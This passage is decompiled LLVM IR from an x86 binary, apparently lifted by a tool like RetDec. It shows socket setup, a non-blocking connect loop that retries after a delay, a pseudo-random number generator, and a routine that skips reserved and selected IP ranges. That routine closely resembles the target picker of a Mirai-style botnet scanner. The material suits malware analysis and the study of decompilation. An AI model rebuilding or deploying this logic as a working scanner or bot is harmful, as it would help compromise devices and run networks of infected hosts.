  %v10_804e2a1 = icmp eq i32 %v1_804e2a0131, 0
  br i1 %v10_804e2a1, label %dec_label_pc_804e18c, label %dec_label_pc_804e2aa

dec_label_pc_804e397:                             ; preds = %dec_label_pc_804e18c
  %v2_804e39a = inttoptr i32 %v0_804e1a1 to i32*
  store i32 12, i32* %v2_804e39a, align 4
  %v2_804e39c = call i32 @function_8050b60(i8 0)
  store i32 %v2_804e39c, i32* %eax.global-to-local, align 4
  %v0_804e3a1 = load i32, i32* @esp, align 4
  %v1_804e3a1 = inttoptr i32 %v0_804e3a1 to i32*
  store i32 13, i32* %v1_804e3a1, align 4
  %v2_804e3a8 = call i32 @function_8050b60(i8 0)
  store i32 %v2_804e3a8, i32* %eax.global-to-local, align 4
  %v0_804e3ad = load i32, i32* @esp, align 4
  %v1_804e3ad = inttoptr i32 %v0_804e3ad to i32*
  store i32 14, i32* %v1_804e3ad, align 4
  %v2_804e3b4 = call i32 @function_8050b60(i8 0)
  store i32 %v2_804e3b4, i32* %eax.global-to-local, align 4
  %v0_804e3b9 = load i32, i32* @esp, align 4
  %v1_804e3b9 = inttoptr i32 %v0_804e3b9 to i32*
  store i32 15, i32* %v1_804e3b9, align 4
  %v2_804e3c0 = call i32 @function_8050b60(i8 0)
  store i32 %v2_804e3c0, i32* %eax.global-to-local, align 4
  %v0_804e3c5 = load i32, i32* @esp, align 4
  %v1_804e3c5 = inttoptr i32 %v0_804e3c5 to i32*
  store i32 16, i32* %v1_804e3c5, align 4
  %v2_804e3cc = call i32 @function_8050b60(i8 0)
  store i32 %v2_804e3cc, i32* %eax.global-to-local, align 4
  %v0_804e3d1 = load i32, i32* @esp, align 4
  %v1_804e3d1 = inttoptr i32 %v0_804e3d1 to i32*
  %v2_804e3d1 = load i32, i32* %v1_804e3d1, align 4
  store i32 %v2_804e3d1, i32* %eax.global-to-local, align 4
  %v1_804e3d2 = add i32 %v0_804e3d1, 56
  %v2_804e3d2 = inttoptr i32 %v1_804e3d2 to i32*
  %v3_804e3d2 = load i32, i32* %v2_804e3d2, align 4
  store i32 %v3_804e3d2, i32* @edi, align 4
  store i32 %v3_804e3d2, i32* %v1_804e3d1, align 4
  %v1_804e3d7 = call i32 @function_8051a81(i32 0)
  store i32 %v1_804e3d7, i32* @eax, align 4
  %v0_804e3dc = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e31c

; uselistorder directives
  uselistorder i32 %v1_804e2a0, { 1, 0 }
  uselistorder i32 %v6_804e2ae, { 2, 0, 1 }
  uselistorder i32 %v0_804e391129, { 1, 0 }
  uselistorder i32 %v2_804e28f, { 1, 0 }
  uselistorder i32 %v3_804e288, { 1, 0, 2 }
  uselistorder i32 %v0_804e18c52, { 2, 1, 0 }
  uselistorder i32 %v0_804e297, { 0, 4, 5, 6, 3, 2, 1 }
  uselistorder i32 %v6_804e274, { 0, 2, 1 }
  uselistorder i32 %v0_804e378, { 1, 0 }
  uselistorder i32 %v0_804e263, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e25a, { 1, 0 }
  uselistorder i32 %v1_804e25a, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804e25a, { 1, 2, 3, 4, 7, 0, 8, 5, 6, 9 }
  uselistorder i32 %v0_804e250, { 1, 0 }
  uselistorder i32 %v6_804e23c, { 1, 0 }
  uselistorder i32 %v0_804e368, { 1, 0 }
  uselistorder i32 %v0_804e22f, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e226, { 1, 0 }
  uselistorder i32 %v0_804e226, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804e21c, { 1, 0 }
  uselistorder i32 %v6_804e208, { 1, 0 }
  uselistorder i32 %v0_804e358, { 1, 0 }
  uselistorder i32 %v0_804e1fb, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e1f2, { 1, 0 }
  uselistorder i32 %v0_804e1f2, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804e1e8, { 1, 0 }
  uselistorder i32 %v6_804e1d4, { 1, 0 }
  uselistorder i32 %v0_804e2c0, { 1, 0 }
  uselistorder i32 %v0_804e1c1, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e1b8, { 1, 0 }
  uselistorder i32 %v0_804e1b8, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_804e18c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804e0c7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e0a4, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_804e09f, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e03a, { 1, 0 }
  uselistorder i32 %v0_804e031, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804e02c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804e03a.pre, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_804e013, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804dfda, { 0, 2, 1 }
  uselistorder i32 %v4_804df95, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804df3a, { 2, 1, 0 }
  uselistorder i32 %v0_804def4, { 1, 0, 2 }
  uselistorder i32 %v1_804dea1, { 1, 0 }
  uselistorder i32 %v1_804de9e, { 2, 1, 0 }
  uselistorder i32 %v0_804de9e, { 1, 0, 2 }
  uselistorder i32 %v2_804de9c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804deb8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804de6d, { 1, 0 }
  uselistorder i32 %v1_804de6a, { 1, 0, 2 }
  uselistorder i32 %v0_804de5d, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804de58, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804de50, { 1, 0 }
  uselistorder i32 %v3_804dd85, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804dd43, { 1, 0, 2 }
  uselistorder i32 %v2_804dd2f, { 3, 2, 4, 0, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 %v1_804dcf2, { 0, 2, 1 }
  uselistorder i32 %v3_804dcb4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v3_804dc67, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804dc13, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-52, { 1, 2, 0 }
  uselistorder i32* %eax.global-to-local, { 129, 130, 131, 132, 133, 134, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 135, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128 }
  uselistorder i32 8424, { 1, 0 }
  uselistorder i32 ()* @function_8051dd4, { 2, 1, 0 }
  uselistorder i32 ()* @function_8051850, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_80517d0, { 0, 1, 2, 3, 4, 5, 6, 7, 20, 21, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 8264, { 0, 2, 1 }
  uselistorder i32 8328, { 0, 1, 3, 2 }
  uselistorder i32 ()* @function_8051f35, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_8051e44, { 2, 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_8051500, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 27, 28, 29, 30, 26, 31, 32, 33, 63, 57, 58, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 60, 61, 62 }
  uselistorder i8 7, { 3, 4, 5, 6, 7, 1, 2, 0 }
  uselistorder label %dec_label_pc_804e31c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e2ca, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e2aa, { 1, 0 }
  uselistorder label %dec_label_pc_804e288, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e270, { 1, 0 }
  uselistorder label %dec_label_pc_804e250, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e238, { 1, 0 }
  uselistorder label %dec_label_pc_804e21c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e204, { 1, 0 }
  uselistorder label %dec_label_pc_804e1e8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e1d0, { 1, 0 }
  uselistorder label %dec_label_pc_804e18c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804e0c7, { 1, 0 }
  uselistorder label %dec_label_pc_804e0bb, { 1, 0 }
  uselistorder label %dec_label_pc_804e038, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dffd, { 1, 0 }
  uselistorder label %dec_label_pc_804de50, { 6, 3, 1, 0, 4, 5, 2, 7 }
  uselistorder label %dec_label_pc_804dde2, { 1, 0 }
  uselistorder label %dec_label_pc_804dce1, { 1, 0 }
  uselistorder label %dec_label_pc_804dc94, { 1, 0 }
}

define i32 @function_804e3f0() local_unnamed_addr {
dec_label_pc_804e3f0:
  store i32 134538240, i32* @global_var_8056074.24, align 4
  %v0_804e3fa = load i32, i32* @eax, align 4
  ret i32 %v0_804e3fa
}

define i32 @function_804e400() local_unnamed_addr {
dec_label_pc_804e400:
  store i32 1674493113, i32* @global_var_80561cc.25, align 4
  %v2_804e40f = call i32 @function_8050be0(i8 4)
  %v3_804e41a = call i32 @function_8050b30(i32 4, i32* null)
  %v4_804e41a = inttoptr i32 %v3_804e41a to i16*
  %v3_804e41f = load i16, i16* %v4_804e41a, align 2
  store i16 %v3_804e41f, i16* bitcast (i32* @global_var_80561ca.26 to i16*), align 4
  %v2_804e42f = call i32 @function_8050b60(i8 4)
  ret i32 %v2_804e42f
}

define i32 @function_804e440() local_unnamed_addr {
dec_label_pc_804e440:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_804e453 = call i32 @function_8052275(i32 2, i32 1, i32 0)
  store i32 %v3_804e453, i32* @global_var_805606c.27, align 4
  %v10_804e462 = icmp eq i32 %v3_804e453, -1
  br i1 %v10_804e462, label %dec_label_pc_804e502, label %dec_label_pc_804e46b

dec_label_pc_804e46b:                             ; preds = %dec_label_pc_804e440
  %v2_804e470 = ptrtoint i32* %stack_var_-12 to i32
  %v5_804e47a = call i32 @function_805223a(i32 %v3_804e453, i32 1, i32 2, i32 %v2_804e470, i32 4)
  %v0_804e482 = load i32, i32* @global_var_805606c.27, align 4
  %v3_804e48d = call i32 @function_80519bd(i32 %v0_804e482, i32 3, i32 0)
  %v12_804e495 = or i32 %v3_804e48d, 2048
  %v0_804e499 = load i32, i32* @global_var_805606c.27, align 4
  %v3_804e4a1 = call i32 @function_80519bd(i32 %v0_804e499, i32 4, i32 %v12_804e495)
  %v0_804e4ae = load i8, i8* @global_var_8056078.28, align 8
  %v1_804e4ae = icmp eq i8 %v0_804e4ae, 0
  br i1 %v1_804e4ae, label %dec_label_pc_804e508, label %dec_label_pc_804e4b7

dec_label_pc_804e4b7:                             ; preds = %dec_label_pc_804e46b, %dec_label_pc_804e508
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804e4c9 = call i32 @function_8051fb9(i32 2)
  %v2_804e4ce = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804e4ce, i32* @esi, align 4
  store i32 %v1_804e4c9, i32* @ebx, align 4
  %v1_804e4d4 = inttoptr i32 %v1_804e4c9 to i32*
  store i32 0, i32* %v1_804e4d4, align 4
  %v0_804e4db = load i32, i32* @global_var_805606c.27, align 4
  %v4_804e4e4 = call i32 @function_805206f(i32 %v0_804e4db, i32 %v2_804e4ce, i32 16, i32 %v1_804e4c9)
  %v8_804e4ec = icmp eq i32 %v4_804e4e4, -1
  br i1 %v8_804e4ec, label %dec_label_pc_804e510, label %dec_label_pc_804e4ef

dec_label_pc_804e4ef:                             ; preds = %dec_label_pc_804e4b7
  %v0_804e4ef = load i32, i32* @global_var_805606c.27, align 4
  %v2_804e4fa = call i32 @function_805212b(i32 %v0_804e4ef, i32 1)
  br label %dec_label_pc_804e502

dec_label_pc_804e502:                             ; preds = %dec_label_pc_804e440, %dec_label_pc_804e4ef
  %v0_804e507 = phi i32 [ -1, %dec_label_pc_804e440 ], [ %v2_804e4fa, %dec_label_pc_804e4ef ]
  ret i32 %v0_804e507

dec_label_pc_804e508:                             ; preds = %dec_label_pc_804e46b
  br label %dec_label_pc_804e4b7

dec_label_pc_804e510:                             ; preds = %dec_label_pc_804e4b7
  %v0_804e510 = load i32, i32* @ebx, align 4
  %v1_804e510 = inttoptr i32 %v0_804e510 to i32*
  %v2_804e510 = load i32, i32* %v1_804e510, align 4
  %v11_804e510 = icmp eq i32 %v2_804e510, 99
  br i1 %v11_804e510, label %dec_label_pc_804e56d, label %dec_label_pc_804e515

dec_label_pc_804e515:                             ; preds = %dec_label_pc_804e510, %dec_label_pc_804e56d
  store i32 2, i32* %stack_var_-28, align 4
  %v0_804e52c = load i32, i32* @global_var_805606c.27, align 4
  %v3_804e535 = call i32 @function_805209a(i32 %v0_804e52c, i32 %v2_804e4ce, i32 16)
  %v1_804e541 = call i32 @function_8053630(i32 5)
  %v0_804e547 = load i32, i32* @global_var_805606c.27, align 4
  store i32 %v0_804e547, i32* @esi, align 4
  %v1_804e54e = call i32 @function_8051a81(i32 %v0_804e547)
  %v1_804e55a = call i32 @function_804d5e0(i32 52671)
  %v0_804e55f = call i32 @function_804e440()
  ret i32 %v0_804e55f

dec_label_pc_804e56d:                             ; preds = %dec_label_pc_804e510
  store i8 0, i8* @global_var_8056078.28, align 8
  br label %dec_label_pc_804e515

; uselistorder directives
  uselistorder i32 %v3_804e453, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_804d5e0, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_8053630, { 0, 2, 5, 4, 3, 1 }
  uselistorder i32 (i32, i32)* @function_805212b, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_805206f, { 0, 2, 1 }
  uselistorder i8* @global_var_8056078.28, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_805223a, { 1, 0 }
  uselistorder label %dec_label_pc_804e515, { 1, 0 }
  uselistorder label %dec_label_pc_804e502, { 1, 0 }
  uselistorder label %dec_label_pc_804e4b7, { 1, 0 }
}

define i32 @function_804f020() local_unnamed_addr {
dec_label_pc_804f020:
  %v0_804f020 = load i32, i32* @global_var_8056148.30, align 8
  %v0_804f028 = load i32, i32* @global_var_8056154.31, align 4
  %v2_804f02e = mul i32 %v0_804f020, 2048
  %v2_804f033 = udiv i32 %v0_804f028, 524288
  store i32 %v2_804f033, i32* @ecx, align 4
  %v2_804f036 = xor i32 %v2_804f02e, %v0_804f020
  %v0_804f038 = load i32, i32* @global_var_805614c.32, align 4
  store i32 %v0_804f038, i32* @global_var_8056148.30, align 8
  %v0_804f042 = load i32, i32* @global_var_8056150.33, align 16
  store i32 %v0_804f042, i32* @global_var_805614c.32, align 4
  store i32 %v0_804f028, i32* @global_var_8056150.33, align 16
  %v2_804f054 = xor i32 %v2_804f033, %v0_804f028
  %v2_804f056 = udiv i32 %v2_804f036, 256
  %v2_804f059 = xor i32 %v2_804f056, %v2_804f036
  %v2_804f05b = xor i32 %v2_804f059, %v2_804f054
  store i32 %v2_804f05b, i32* @global_var_8056154.31, align 4
  ret i32 %v2_804f05b

; uselistorder directives
  uselistorder i32 %v2_804f036, { 1, 0 }
  uselistorder i32 %v2_804f033, { 1, 0 }
  uselistorder i32 %v0_804f028, { 1, 2, 0 }
  uselistorder i32 %v0_804f020, { 1, 0 }
}

define i32 @function_804f2d0() local_unnamed_addr {
dec_label_pc_804f2d0:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_804f2d0 = load i32, i32* @ebx, align 4
  %v0_804f2d1 = load i32, i32* @eax, align 4
  store i32 %v0_804f2d1, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804f2f6 = add i32 %v0_804f2d1, 4
  %v2_804f2f6 = inttoptr i32 %v1_804f2f6 to i32*
  %v3_804f2f6 = load i32, i32* %v2_804f2f6, align 4
  %v10_804f2f9 = icmp eq i32 %v3_804f2f6, -1
  br i1 %v10_804f2f9, label %dec_label_pc_804f2d0.dec_label_pc_804f30a_crit_edge, label %dec_label_pc_804f2fe

dec_label_pc_804f2d0.dec_label_pc_804f30a_crit_edge: ; preds = %dec_label_pc_804f2d0
  br label %dec_label_pc_804f30a

dec_label_pc_804f2fe:                             ; preds = %dec_label_pc_804f2d0
  %v1_804f302 = call i32 @function_8051a81(i32 %v3_804f2f6)
  br label %dec_label_pc_804f30a

dec_label_pc_804f30a:                             ; preds = %dec_label_pc_804f2d0.dec_label_pc_804f30a_crit_edge, %dec_label_pc_804f2fe
  %v3_804f311 = call i32 @function_8052275(i32 2, i32 1, i32 0)
  %v1_804f319 = load i32, i32* @ebx, align 4
  %v2_804f319 = add i32 %v1_804f319, 4
  %v3_804f319 = inttoptr i32 %v2_804f319 to i32*
  store i32 %v3_804f311, i32* %v3_804f319, align 4
  %v8_804f31c = icmp eq i32 %v3_804f311, -1
  br i1 %v8_804f31c, label %dec_label_pc_804f30a.dec_label_pc_804f393_crit_edge, label %dec_label_pc_804f31f

dec_label_pc_804f30a.dec_label_pc_804f393_crit_edge: ; preds = %dec_label_pc_804f30a
  br label %dec_label_pc_804f393

dec_label_pc_804f31f:                             ; preds = %dec_label_pc_804f30a
  %v0_804f321 = load i32, i32* @ebx, align 4
  %v1_804f321 = add i32 %v0_804f321, 28
  store i32 %v1_804f321, i32* @eax, align 4
  %v1_804f329 = add i32 %v0_804f321, 24
  %v2_804f329 = inttoptr i32 %v1_804f329 to i32*
  store i32 0, i32* %v2_804f329, align 4
  %v0_804f330 = load i32, i32* @eax, align 4
  %v2_804f331 = call i32 @function_8051570(i32 %v0_804f330, i32 256)
  %v0_804f339 = load i32, i32* @ebx, align 4
  %v1_804f339 = add i32 %v0_804f339, 4
  %v2_804f339 = inttoptr i32 %v1_804f339 to i32*
  %v3_804f339 = load i32, i32* %v2_804f339, align 4
  %v3_804f341 = call i32 @function_80519bd(i32 %v3_804f339, i32 3, i32 0)
  %v0_804f349 = load i32, i32* @ebx, align 4
  %v1_804f349 = add i32 %v0_804f349, 4
  %v2_804f349 = inttoptr i32 %v1_804f349 to i32*
  %v3_804f349 = load i32, i32* %v2_804f349, align 4
  %v12_804f34c = or i32 %v3_804f341, 2048
  %v3_804f353 = call i32 @function_80519bd(i32 %v3_804f349, i32 4, i32 %v12_804f34c)
  %v0_804f358 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_804f36e = load i32, i32* @global_var_8056190.34, align 16
  %v2_804f373 = add i32 %v0_804f358, 8
  %v3_804f373 = inttoptr i32 %v2_804f373 to i32*
  store i32 %v0_804f36e, i32* %v3_804f373, align 4
  %v2_804f376 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804f37d = load i32, i32* @ebx, align 4
  %v1_804f37d = add i32 %v0_804f37d, 4
  %v2_804f37d = inttoptr i32 %v1_804f37d to i32*
  %v3_804f37d = load i32, i32* %v2_804f37d, align 4
  store i32 %v3_804f37d, i32* %edx.global-to-local, align 4
  %v1_804f380 = add i32 %v0_804f37d, 12
  %v2_804f380 = inttoptr i32 %v1_804f380 to i32*
  store i32 1, i32* %v2_804f380, align 4
  %v0_804f38a = load i32, i32* %edx.global-to-local, align 4
  %v3_804f38b = call i32 @function_805209a(i32 %v0_804f38a, i32 %v2_804f376, i32 16)
  br label %dec_label_pc_804f393

dec_label_pc_804f393:                             ; preds = %dec_label_pc_804f30a.dec_label_pc_804f393_crit_edge, %dec_label_pc_804f31f
  %v0_804f397 = phi i32 [ 0, %dec_label_pc_804f30a.dec_label_pc_804f393_crit_edge ], [ %v3_804f38b, %dec_label_pc_804f31f ]
  store i32 %v0_804f2d0, i32* @ebx, align 4
  ret i32 %v0_804f397

; uselistorder directives
  uselistorder i32 %v3_804f2f6, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @function_8051570, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f393, { 1, 0 }
  uselistorder label %dec_label_pc_804f30a, { 1, 0 }
}

define i32 @function_804fa03() local_unnamed_addr {
dec_label_pc_804fa03:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804fece, %dec_label_pc_804fa03
  %v0_804fa03 = load i32, i32* @global_var_8056190.34, align 16
  store i32 %v0_804fa03, i32* @esi, align 4
  %v0_804fa09 = load i32, i32* @esp, align 4
  %v1_804fa09 = add i32 %v0_804fa09, 16
  %v2_804fa09 = inttoptr i32 %v1_804fa09 to i32*
  %v3_804fa09 = load i32, i32* %v2_804fa09, align 4
  %v15_804fa09 = icmp eq i32 %v3_804fa09, %v0_804fa03
  br i1 %v15_804fa09, label %dec_label_pc_804fc9d, label %dec_label_pc_804fa13

dec_label_pc_804fa13:                             ; preds = %.loopexit
  %v1_804fa13 = add i32 %v0_804fa09, 1812
  store i32 %v1_804fa13, i32* @ebp, align 4
  %v1_804fa1a = add i32 %v0_804fa09, 1852
  %v2_804fa1a = inttoptr i32 %v1_804fa1a to i32*
  store i32 0, i32* %v2_804fa1a, align 4
  %v0_804fbaf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804fbaf

dec_label_pc_804fa30:                             ; preds = %dec_label_pc_804fc23
  %v11_804fa30 = icmp eq i8 %v2_804fc06, -84
  br i1 %v11_804fa30, label %dec_label_pc_804fc70, label %dec_label_pc_804fa39

dec_label_pc_804fa39:                             ; preds = %dec_label_pc_804fa30
  %v10_804fa39 = icmp eq i8 %v2_804fc06, 100
  br i1 %v10_804fa39, label %dec_label_pc_804fa39.dec_label_pc_804fc3a_crit_edge, label %dec_label_pc_804fa42

dec_label_pc_804fa39.dec_label_pc_804fc3a_crit_edge: ; preds = %dec_label_pc_804fa39
  %.pre = trunc i32 %v2_804fbfd to i8
  br label %dec_label_pc_804fc3a

dec_label_pc_804fa42:                             ; preds = %dec_label_pc_804fc31, %dec_label_pc_804fa39
  %v11_804fa42 = icmp eq i8 %v2_804fc06, -87
  br i1 %v11_804fa42, label %dec_label_pc_804fc8b, label %dec_label_pc_804fa4b

dec_label_pc_804fa4b:                             ; preds = %dec_label_pc_804fc82, %dec_label_pc_804fa42
  %v0_804fa4b = phi i32 [ %v0_804fc82, %dec_label_pc_804fc82 ], [ %v5_804fbfb, %dec_label_pc_804fa42 ]
  %v0_804fad358 = phi i32 [ %v0_804fc79, %dec_label_pc_804fc82 ], [ %v2_804fbfd, %dec_label_pc_804fa42 ]
  %v1_804fa4b = trunc i32 %v0_804fa4b to i8
  %v11_804fa4b = icmp eq i8 %v1_804fa4b, -58
  br i1 %v11_804fa4b, label %dec_label_pc_804fc51, label %dec_label_pc_804fa54

dec_label_pc_804fa54:                             ; preds = %dec_label_pc_804fc8b, %dec_label_pc_804fc48, %dec_label_pc_804fa4b
  %v0_804fa54 = phi i32 [ %v0_804fa5465, %dec_label_pc_804fc8b ], [ %v5_804fbfb, %dec_label_pc_804fc48 ], [ %v0_804fa4b, %dec_label_pc_804fa4b ]
  %v0_804fad357 = phi i32 [ %v0_804fc8b, %dec_label_pc_804fc8b ], [ %v2_804fbfd, %dec_label_pc_804fc48 ], [ %v0_804fad358, %dec_label_pc_804fa4b ]
  %v1_804fa54 = trunc i32 %v0_804fa54 to i8
  %tmp259 = icmp ult i8 %v1_804fa54, -32
  br i1 %tmp259, label %dec_label_pc_804fa5d, label %dec_label_pc_804fbf0.preheader

dec_label_pc_804fa5d:                             ; preds = %dec_label_pc_804fc3a, %dec_label_pc_804fc70.dec_label_pc_804fa5d_crit_edge, %dec_label_pc_804fc5a, %dec_label_pc_804fa54, %dec_label_pc_804fc51
  %v0_804fad3 = phi i32 [ %v0_804fc79, %dec_label_pc_804fc70.dec_label_pc_804fa5d_crit_edge ], [ %v0_804fc5a, %dec_label_pc_804fc5a ], [ %v0_804fad357, %dec_label_pc_804fa54 ], [ %v0_804fc5a, %dec_label_pc_804fc51 ], [ %v2_804fbfd, %dec_label_pc_804fc3a ]
  %v0_804fae1 = phi i32 [ %v0_804fa5d.pre, %dec_label_pc_804fc70.dec_label_pc_804fa5d_crit_edge ], [ %v0_804fa5d54, %dec_label_pc_804fc5a ], [ %v0_804fa54, %dec_label_pc_804fa54 ], [ %v0_804fa5d54, %dec_label_pc_804fc51 ], [ %v5_804fbfb, %dec_label_pc_804fc3a ]
  %v1_804fa5d = add i32 %v0_804fae1, -6
  store i32 %v1_804fa5d, i32* %eax.global-to-local, align 4
  %v1_804fa60 = trunc i32 %v1_804fa5d to i8
  %tmp260 = or i8 %v1_804fa60, 1
  %tmp261 = icmp eq i8 %tmp260, 1
  br i1 %tmp261, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804fa68

dec_label_pc_804fa68:                             ; preds = %dec_label_pc_804fa5d
  %v1_804fa68 = trunc i32 %v0_804fae1 to i8
  %v10_804fa68 = icmp eq i8 %v1_804fa68, 11
  br i1 %v10_804fa68, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804fa71

dec_label_pc_804fa71:                             ; preds = %dec_label_pc_804fa68
  %v10_804fa71 = icmp eq i8 %v1_804fa68, 21
  br i1 %v10_804fa71, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804fa7a

dec_label_pc_804fa7a:                             ; preds = %dec_label_pc_804fa71
  %v10_804fa7a = icmp eq i8 %v1_804fa68, 22
  br i1 %v10_804fa7a, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804fa83

dec_label_pc_804fa83:                             ; preds = %dec_label_pc_804fa7a
  %v10_804fa83 = icmp eq i8 %v1_804fa68, 26
  br i1 %v10_804fa83, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804fa8c

dec_label_pc_804fa8c:                             ; preds = %dec_label_pc_804fa83
  %v10_804fa8c = icmp eq i8 %v1_804fa68, 28
  br i1 %v10_804fa8c, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804fa95

dec_label_pc_804fa95:                             ; preds = %dec_label_pc_804fa8c
  %v10_804fa95 = icmp eq i8 %v1_804fa68, 29
  br i1 %v10_804fa95, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804fa9e

dec_label_pc_804fa9e:                             ; preds = %dec_label_pc_804fa95
  %v10_804fa9e = icmp eq i8 %v1_804fa68, 30
  br i1 %v10_804fa9e, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804faa7

dec_label_pc_804faa7:                             ; preds = %dec_label_pc_804fa9e
  %v10_804faa7 = icmp eq i8 %v1_804fa68, 33
  br i1 %v10_804faa7, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804fab0

dec_label_pc_804fab0:                             ; preds = %dec_label_pc_804faa7
  %v10_804fab0 = icmp eq i8 %v1_804fa68, 55
  br i1 %v10_804fab0, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804fab9

dec_label_pc_804fab9:                             ; preds = %dec_label_pc_804fab0
  %v11_804fab9 = icmp eq i8 %v1_804fa68, -42
  br i1 %v11_804fab9, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804fac2

dec_label_pc_804fac2:                             ; preds = %dec_label_pc_804fab9
  %v11_804fac2 = icmp eq i8 %v1_804fa68, -41
  br i1 %v11_804fac2, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804facb

dec_label_pc_804facb:                             ; preds = %dec_label_pc_804fac2
  %v0_804facd = load i32, i32* @edx, align 4
  store i16 0, i16* bitcast (i32* @global_var_805616a.35 to i16*), align 4
  %v1_804fad3 = mul i32 %v0_804fad3, 65536
  %v2_804fade = and i32 %v1_804fad3, 16711680
  %v2_804fae1 = mul i32 %v0_804fae1, 16777216
  %v1_804facd = mul i32 %v0_804facd, 256
  %v2_804fae7 = or i32 %v2_804fade, %v2_804fae1
  %v0_804fae9 = load i32, i32* @edi, align 4
  %v1_804faeb = urem i32 %v0_804fae9, 256
  store i32 %v1_804faeb, i32* %eax.global-to-local, align 4
  %v2_804faf0 = or i32 %v1_804faeb, %v2_804fae7
  store i32 %v2_804faf0, i32* %ecx.global-to-local, align 4
  %v2_804faf2 = or i32 %v1_804faeb, %v1_804facd
  %v1_804faf4 = trunc i32 %v2_804faf2 to i16
  %v2_804faf4 = call i16 @llvm.bswap.i16(i16 %v1_804faf4)
  %v3_804faf4 = zext i16 %v2_804faf4 to i32
